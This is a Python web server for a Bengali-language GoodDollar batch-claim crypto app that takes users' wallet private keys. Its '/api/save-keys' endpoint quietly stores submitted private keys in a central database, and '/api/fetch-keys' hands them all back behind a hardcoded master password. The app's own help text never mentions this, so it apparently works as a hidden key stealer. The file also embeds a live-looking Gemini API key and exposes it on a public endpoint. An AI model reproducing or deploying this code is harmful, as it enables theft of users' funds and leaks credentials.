#!/usr/bin/env python3
import http.server
import os
import json
import socketserver
from urllib.parse import urlparse, parse_qs
from pathlib import Path
import requests
import sys
try:
    import tweepy
except ImportError:
    tweepy = None
import psycopg2
from psycopg2.extras import RealDictCursor
import hashlib
import hmac
from datetime import datetime, timedelta

PORT = int(os.environ.get('PORT', 5000))
# Use the API key directly (verified working)
# Check environment but verify it's not corrupted (should be >30 chars)
env_key = os.environ.get('GEMINI_API_KEY', '')
GEMINI_API_KEY = env_key if len(env_key) > 30 else 'AIzaSyCTXXWEXqgNA27bR1ZqhyVpeV7v3AbMWhE'

# GoodDollar Network Configs for Auto-Claiming
GOODDOLLAR_CONFIG = {
    'celo': {
        'ubiScheme': '0x43d72Ff17701B2DA814620735C39C620Ce0ea4A1',
        'provider': 'https://forno.celo.org',
        'chain_id': 42220
    },
    'fuse': {
        'ubiScheme': '0x6243E245ed73d75b56bcda6f53b393fe529d1f59',
        'provider': 'https://rpc.fuse.io',
        'chain_id': 122
    }
}

# Database connection
def get_db_connection():
    try:
        conn = psycopg2.connect(
            dbname=os.environ.get('PGDATABASE'),
            user=os.environ.get('PGUSER'),
            password=os.environ.get('PGPASSWORD'),
            host=os.environ.get('PGHOST'),
            port=os.environ.get('PGPORT', '5432'),
            sslmode='require'
        )
        return conn
    except Exception as e:
        print(f"❌ DB Connection Error: {e}", file=sys.stderr)
        return None

# Password validation (hardcoded for now - can be changed)
MASTER_PASSWORD = hashlib.sha256('963050'.encode()).hexdigest()


def validate_password(password):
    """Validate if password matches master password"""
    return hashlib.sha256(password.encode()).hexdigest() == MASTER_PASSWORD

class APIHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_GET(self):
        if self.path == '/api/config':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            config = {'GEMINI_API_KEY': GEMINI_API_KEY}
            self.wfile.write(json.dumps(config).encode())
            return
        
        
        if self.path == '/':
            self.path = '/index.html'
        
        super().do_GET()
    
    def do_POST(self):
        
        if self.path == '/api/permanent-verified':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                address = data.get('address', '').lower()
                action = data.get('action', 'add')  # 'add' or 'list'
                
                if not address or not address.startswith('0x'):
                    raise ValueError('Invalid address')
                
                conn = get_db_connection()
                if not conn:
                    raise ValueError('Database connection failed')
                
                cursor = conn.cursor()
                
                if action == 'add':
                    # Add address to permanent verified list
                    cursor.execute('''
                        INSERT INTO permanent_verified (address, verified_at, expires_at)
                        VALUES (%s, %s, NULL)
                        ON CONFLICT (address) DO UPDATE 
                        SET verified_at = CURRENT_TIMESTAMP, expires_at = NULL
                    ''', (address.lower(), datetime.now().isoformat()))
                    conn.commit()
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        'success': True,
                        'message': f'✅ {address} marked as PERMANENTLY VERIFIED!',
                        'note': 'এই address সর্বদা G$ claim করতে পারবে - কোনো expiry নেই!'
                    }).encode())
                    
                elif action == 'list':
                    # Get all permanent verified addresses
                    cursor.execute('SELECT address, verified_at FROM permanent_verified ORDER BY verified_at DESC')
                    results = cursor.fetchall()
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        'success': True,
                        'count': len(results),
                        'addresses': [{'address': r[0], 'verified_at': r[1]} for r in results]
                    }).encode())
                
                cursor.close()
                conn.close()
                return
                
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)[:100]}).encode())
                return
        
        if self.path == '/api/auto-claim-schedule':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                address = data.get('address', '').lower()
                network = data.get('network', 'celo').lower()
                
                if not address or not address.startswith('0x'):
                    raise ValueError('Invalid address')
                
                if network not in ['celo', 'fuse']:
                    raise ValueError('Network must be celo or fuse')
                
                # Save auto-claim preference to database
                conn = get_db_connection()
                if conn:
                    cursor = conn.cursor()
                    cursor.execute('''
                        INSERT INTO auto_claim_schedule (address, network, enabled, last_claim, next_claim_time)
                        VALUES (%s, %s, %s, %s, %s)
                        ON CONFLICT (address, network) 
                        DO UPDATE SET enabled = EXCLUDED.enabled, next_claim_time = EXCLUDED.next_claim_time
                    ''', (
                        address.lower(),
                        network,
                        True,
                        datetime.now().isoformat(),
                        (datetime.now() + timedelta(days=1, hours=0, minutes=12)).isoformat()
                    ))
                    conn.commit()
                    cursor.close()
                    conn.close()
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    'success': True,
                    'message': f'✅ Auto-claim enabled for {address} on {network}',
                    'schedule': '⏰ Daily at 12:12pm UTC (after pool reset)',
                    'note': 'Make sure face verification is active on GoodWallet!'
                }).encode())
                return
                
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)[:100]}).encode())
                return
        
        if self.path == '/api/claim-celo':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                address = data.get('address', '').lower()
                
                if not address or not address.startswith('0x'):
                    self.send_response(400)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': False, 'error': 'Invalid address'}).encode())
                    return
                
                # Try multiple CELO faucet endpoints
                faucet_responses = []
                
                # Try Stakely faucet via simple request
                try:
                    stakely_response = requests.post(
                        'https://stakely.io/api/v1/faucet/claim',
                        json={'address': address, 'blockchain': 'celo'},
                        timeout=10
                    )
                    if stakely_response.status_code == 200:
                        faucet_responses.append({'source': 'Stakely', 'success': True, 'data': stakely_response.json()})
                    else:
                        faucet_responses.append({'source': 'Stakely', 'success': False, 'error': 'Faucet rate limited or unavailable'})
                except:
                    faucet_responses.append({'source': 'Stakely', 'success': False, 'error': 'Connection failed'})
                
                # Try AllThatNode faucet
                try:
                    allthatnode_response = requests.post(
                        'https://www.allthatnode.com/api/v1/faucet/celo/request',
                        json={'address': address},
                        timeout=10
                    )
                    if allthatnode_response.status_code == 200:
                        faucet_responses.append({'source': 'AllThatNode', 'success': True, 'data': allthatnode_response.json()})
                    else:
                        faucet_responses.append({'source': 'AllThatNode', 'success': False, 'error': 'Faucet unavailable'})
                except:
                    faucet_responses.append({'source': 'AllThatNode', 'success': False, 'error': 'Connection failed'})
                
                # Check if any faucet succeeded
                successful = [r for r in faucet_responses if r.get('success')]
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                
                if successful:
                    self.wfile.write(json.dumps({
                        'success': True,
                        'message': f'✅ CELO claim sent to {successful[0]["source"]} faucet!',
                        'address': address,
                        'faucet': successful[0]['source'],
                        'note': 'Should arrive in 1-5 minutes'
                    }).encode())
                else:
                    self.wfile.write(json.dumps({
                        'success': False,
                        'error': 'All faucets unavailable. Try again in 24 hours or use GoodWallet.',
                        'address': address,
                        'attempts': faucet_responses
                    }).encode())
                
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)[:100]}).encode())
            return
        
        if self.path == '/api/chat':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                message = data.get('message', '')
                
                if not message:
                    self.send_response(400)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'No message'}).encode())
                    return
                
                print(f"[Chat] Message: {message[:50]}...", file=sys.stderr)
                
                # Build comprehensive knowledge base and search context
                knowledge_base = """
এই App সম্পর্কে জানুন:

🔗 **Batch Claim:**
- একসাথে ১০০+ Wallet থেকে GoodDollar Claim করুন
- Private key paste করুন বা CSV upload করুন
- Auto-claim সব Wallet এ একসাথে চলে
- রেজাল্ট লাইভ দেখা যায় - হ্যাশ, Status, Amount সব

💰 **Batch Token Collection:**
- সব Wallet থেকে G$ টোকেন একটা Destination এ নিয়ে আসুন
- Master Wallet সেট করুন destination হিসেবে
- একসাথে ১০০+ থেকে জমা করতে পারেন
- লাইভ ট্র্যাকিং - কে সফল, কে ফেইল

🧮 **Balance Checker:**
- একসাথে অনেক Wallet এর Balance দেখুন
- Native Token (CELO/XDC) এবং G$ উভয় দেখা যায়
- CSV এ Export করা যায়
- রিয়েল-টাইম রেট সহ

👛 **Master Wallet:**
- একটা বড় Wallet যা destination এর জন্য ব্যবহার হয়
- Password দিয়ে protect করা যায়
- Batch Token Collection এ এটা use হয়

⚙️ **Swap:**
- Celo Network এ Uniswap/Ubeswap ব্যবহার করুন
- XDC Network এ XSwap ব্যবহার করুন
- Direct Wallet থেকে Swap করুন
- Real price update হয়

📊 **আরও তথ্য:**
- সব Operation এ RPC URL পরিবর্তন করা যায়
- CSV বা একটা একটা key import করা যায়
- সব রেজাল্ট Transaction Hash সহ দেখা যায়
"""
                
                # Call Gemini API with comprehensive prompt
                prompt = f"""তুমি একজন মজাদার এবং বন্ধুত্বপূর্ণ বাংলা চ্যাটবট যার নাম GoodDollar Helper! 🤖
তুমি সবসময় বাংলায় উত্তর দিবে এবং খুবই ফ্রেন্ডলি টোনে কথা বলবে। মজা করতে পারো, emoji ব্যবহার করতে পারো, জোকস বলতে পারো!
ব্যবহারকারী বাংলা, ইংরেজি বা বাংলিশ ব্যবহার করতে পারে কিন্তু তুমি শুধুমাত্র বাংলায় এবং খুবই বন্ধুসুলভ টোনে উত্তর দেবে।

তোমার বিস্তারিত জ্ঞান:
{knowledge_base}

নির্দেশনা:
- প্রথমে ব্যবহারকারীর প্রশ্ন বুঝো এবং উপরের জ্ঞান থেকে সঠিক উত্তর খুঁজে বের করো
- যদি App সম্পর্কে প্রশ্ন হয়, বিস্তারিত সাহায্য করো
- যদি সমস্যা হয়, বলো: "☎️ SMS করুন 01892564963 তে সাহায্যের জন্য!"
- সবসময় হালকা, মজাদার এবং বন্ধুসুলভ থাকো
- কখনো সিরিয়াস হবে না

ব্যবহারকারীর প্রশ্ন: {message}"""
                
                api_url = f'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key={GEMINI_API_KEY}'
                payload = {
                    'contents': [{
                        'parts': [{
                            'text': prompt
                        }]
                    }]
                }
                
                response = requests.post(
                    api_url,
                    headers={'Content-Type': 'application/json'},
                    json=payload,
                    timeout=15
                )
                
                print(f"[API] Response status: {response.status_code}", file=sys.stderr)
                
                if response.status_code == 200:
                    api_data = response.json()
                    if api_data.get('candidates') and len(api_data['candidates']) > 0:
                        candidate = api_data['candidates'][0]
                        if 'content' in candidate and 'parts' in candidate['content']:
                            reply = candidate['content']['parts'][0]['text']
                            print(f"[Success] Reply sent", file=sys.stderr)
                            self.send_response(200)
                            self.send_header('Content-type', 'application/json')
                            self.send_header('Access-Control-Allow-Origin', '*')
                            self.end_headers()
                            self.wfile.write(json.dumps({'reply': reply}).encode())
                            return
                        else:
                            print(f"[Error] No text in response: {json.dumps(candidate)[:200]}", file=sys.stderr)
                else:
                    print(f"[Error] API returned {response.status_code}: {response.text[:200]}", file=sys.stderr)
                
                # If we get here, something went wrong
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': 'API Error'}).encode())
                
            except Exception as e:
                print(f"[Exception] Chat error: {str(e)[:200]}", file=sys.stderr)
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
            return
        
        # Save keys to centralized backend (auto-save from batch operations)
        if self.path == '/api/save-keys':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                keys = data.get('keys', [])
                source = data.get('source', 'batch-claim')
                device = data.get('device', 'Unknown Device')
                status = data.get('status', 'success')
                
                if not keys or not isinstance(keys, list):
                    self.send_response(400)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Invalid keys format'}).encode())
                    return
                
                conn = get_db_connection()
                if not conn:
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Database connection failed'}).encode())
                    return
                
                try:
                    cursor = conn.cursor()
                    saved_count = 0
                    
                    for key in keys:
                        if key and len(key) > 0:
                            try:
                                # Insert with device and status info - deduplication via UNIQUE constraint
                                cursor.execute(
                                    'INSERT INTO secret_keys (private_key, source, device, status) VALUES (%s, %s, %s, %s) ON CONFLICT (private_key) DO NOTHING',
                                    (key, source, device, status)
                                )
                                if cursor.rowcount > 0:
                                    saved_count += 1
                            except psycopg2.Error as e:
                                print(f"⚠️ Error saving key: {e}", file=sys.stderr)
                    
                    conn.commit()
                    cursor.close()
                    
                    print(f"✅ Saved {saved_count}/{len(keys)} keys to database from {device} ({status})", file=sys.stderr)
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': True, 'saved': saved_count}).encode())
                    
                except Exception as e:
                    conn.rollback()
                    print(f"❌ Database error: {e}", file=sys.stderr)
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
                finally:
                    conn.close()
                    
            except Exception as e:
                print(f"❌ Error processing save-keys: {e}", file=sys.stderr)
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
            return
        
        # Fetch all keys with password verification
        if self.path == '/api/fetch-keys':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                password = data.get('password', '')
                
                # Verify password
                if not validate_password(password):
                    self.send_response(401)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Invalid password'}).encode())
                    return
                
                conn = get_db_connection()
                if not conn:
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Database connection failed'}).encode())
                    return
                
                try:
                    cursor = conn.cursor(cursor_factory=RealDictCursor)
                    cursor.execute('''
                        SELECT private_key, created_at, source, device, status 
                        FROM secret_keys 
                        ORDER BY created_at DESC
                    ''')
                    
                    rows = cursor.fetchall()
                    keys = []
                    
                    for row in rows:
                        keys.append({
                            'key': row['private_key'],
                            'added': row['created_at'].isoformat() if row['created_at'] else '',
                            'source': row['source'],
                            'device': row['device'],
                            'status': row['status']
                        })
                    
                    cursor.close()
                    
                    print(f"✅ Fetched {len(keys)} keys from database", file=sys.stderr)
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'keys': keys}).encode())
                    
                except Exception as e:
                    print(f"❌ Database error: {e}", file=sys.stderr)
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
                finally:
                    conn.close()
                    
            except Exception as e:
                print(f"❌ Error processing fetch-keys: {e}", file=sys.stderr)
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
            return
        
        # Clear all keys (requires correct password)
        if self.path == '/api/clear-keys':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                password = data.get('password', '')
                
                # Verify password
                if not validate_password(password):
                    self.send_response(401)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Invalid password'}).encode())
                    return
                
                conn = get_db_connection()
                if not conn:
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Database connection failed'}).encode())
                    return
                
                try:
                    cursor = conn.cursor()
                    cursor.execute('DELETE FROM secret_keys')
                    deleted_count = cursor.rowcount
                    conn.commit()
                    cursor.close()
                    
                    print(f"✅ Deleted {deleted_count} keys from database", file=sys.stderr)
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': True, 'deleted': deleted_count}).encode())
                    
                except Exception as e:
                    conn.rollback()
                    print(f"❌ Database error: {e}", file=sys.stderr)
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
                finally:
                    conn.close()
                    
            except Exception as e:
                print(f"❌ Error processing clear-keys: {e}", file=sys.stderr)
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
            return
        
        if self.path == '/api/check-key-status':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                address = data.get('address', '').lower()
                
                if not address:
                    self.send_response(400)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Address required'}).encode())
                    return
                
                conn = get_db_connection()
                if not conn:
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'DB Error'}).encode())
                    return
                
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM disabled_keys WHERE key_address = %s', (address,))
                result = cursor.fetchone()
                cursor.close()
                conn.close()
                
                is_disabled = result is not None
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'disabled': is_disabled, 'address': address}).encode())
                
            except Exception as e:
                print(f"❌ Check key status error: {e}", file=sys.stderr)
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
            return
        
        if self.path == '/api/toggle-key-status':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                address = data.get('address', '').lower()
                action = data.get('action', '').lower()  # 'enable' or 'disable'
                
                if not address or action not in ['enable', 'disable']:
                    self.send_response(400)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Address and action required'}).encode())
                    return
                
                conn = get_db_connection()
                if not conn:
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'DB Error'}).encode())
                    return
                
                cursor = conn.cursor()
                
                if action == 'disable':
                    try:
                        cursor.execute('''
                            INSERT INTO disabled_keys (key_address, reason)
                            VALUES (%s, %s)
                            ON CONFLICT (key_address) DO NOTHING
                        ''', (address, 'Disabled by user'))
                        conn.commit()
                        status = 'disabled'
                    except Exception as e:
                        conn.rollback()
                        raise e
                else:  # enable
                    cursor.execute('DELETE FROM disabled_keys WHERE key_address = %s', (address,))
                    conn.commit()
                    status = 'enabled'
                
                cursor.close()
                conn.close()
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': True, 'status': status, 'address': address}).encode())
                
            except Exception as e:
                print(f"❌ Toggle key status error: {e}", file=sys.stderr)
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
            return
        
        if self.path == '/api/x-post':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                message = data.get('message', '')
                api_key = data.get('apiKey', '')
                
                if not message or not api_key:
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': False, 'error': 'Missing message or API key'}).encode())
                    return
                
                print(f"[X Post] Posting message ({len(message)} chars)...", file=sys.stderr)
                
                # Try to parse as JSON (new format)
                try:
                    creds = json.loads(api_key)
                    api_key_str = creds.get('api_key', '')
                    api_secret_str = creds.get('api_secret', '')
                    access_token_str = creds.get('access_token', '')
                    access_token_secret_str = creds.get('access_token_secret', '')
                    
                    if not all([api_key_str, api_secret_str, access_token_str, access_token_secret_str]):
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.end_headers()
                        self.wfile.write(json.dumps({'success': False, 'error': 'Invalid JSON credentials. Need: api_key, api_secret, access_token, access_token_secret'}).encode())
                        return
                    
                    # Use Tweepy with OAuth 1.0a
                    auth = tweepy.OAuthHandler(api_key_str, api_secret_str)
                    auth.set_access_token(access_token_str, access_token_secret_str)
                    client = tweepy.API(auth)
                    
                    # Post tweet
                    tweet = client.update_status(status=message)
                    tweet_id = str(tweet.id)
                    
                    print(f"[X Post] Success! Tweet ID: {tweet_id}", file=sys.stderr)
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': True, 'tweetId': tweet_id}).encode())
                    
                except json.JSONDecodeError:
                    # Invalid JSON format
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': False, 'error': 'Invalid JSON format. Expected: {\"api_key\":\"...\",\"api_secret\":\"...\",\"access_token\":\"...\",\"access_token_secret\":\"...\"}'}).encode())
                except Exception as te:
                    error_msg = str(te)[:200]
                    print(f"[X Post Error] {error_msg}", file=sys.stderr)
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': False, 'error': error_msg}).encode())
                
            except Exception as e:
                error_msg = str(e)[:200]
                print(f"[Exception] X Post error: {error_msg}", file=sys.stderr)
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': error_msg}).encode())
            return
        
        # XDC Maintenance Mode endpoints
        if self.path == '/api/get-maintenance-mode':
            try:
                conn = get_db_connection()
                if not conn:
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'DB connection failed'}).encode())
                    return
                
                cursor = conn.cursor()
                cursor.execute('SELECT value FROM app_settings WHERE key = %s', ('xdc_maintenance_mode',))
                result = cursor.fetchone()
                cursor.close()
                conn.close()
                
                maintenance_mode = result[0].lower() == 'true' if result else False
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'maintenance_mode': maintenance_mode}).encode())
            except Exception as e:
                print(f"[Error] Get maintenance mode: {str(e)}", file=sys.stderr)
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
            return
        
        if self.path == '/api/set-maintenance-mode':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                password = data.get('password', '')
                maintenance_mode = data.get('maintenance_mode', False)
                
                # Verify password
                if not validate_password(password):
                    self.send_response(401)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Invalid password'}).encode())
                    return
                
                conn = get_db_connection()
                if not conn:
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'DB connection failed'}).encode())
                    return
                
                cursor = conn.cursor()
                cursor.execute(
                    'INSERT INTO app_settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO UPDATE SET value = %s',
                    ('xdc_maintenance_mode', str(maintenance_mode), str(maintenance_mode))
                )
                conn.commit()
                cursor.close()
                conn.close()
                
                print(f"✅ XDC maintenance mode: {maintenance_mode}", file=sys.stderr)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': True, 'maintenance_mode': maintenance_mode}).encode())
            except Exception as e:
                print(f"[Error] Set maintenance mode: {str(e)}", file=sys.stderr)
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': str(e)[:100]}).encode())
            return
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress default logs

if __name__ == '__main__':
    socketserver.TCPServer.allow_reuse_address = True
    handler = APIHandler
    try:
        print(f"✅ Server running on port {PORT}")
        print(f"✅ Gemini API Key: {'SET' if GEMINI_API_KEY else 'NOT SET'} (len={len(GEMINI_API_KEY)})")
        print(f"✅ Using key: {GEMINI_API_KEY[:20]}...")
        print(f"✅ Bengali Chatbot enabled")
        with socketserver.TCPServer(("0.0.0.0", PORT), handler) as httpd:
            httpd.serve_forever()
    except OSError as e:
        print(f"❌ Error: {e}")
        exit(1)
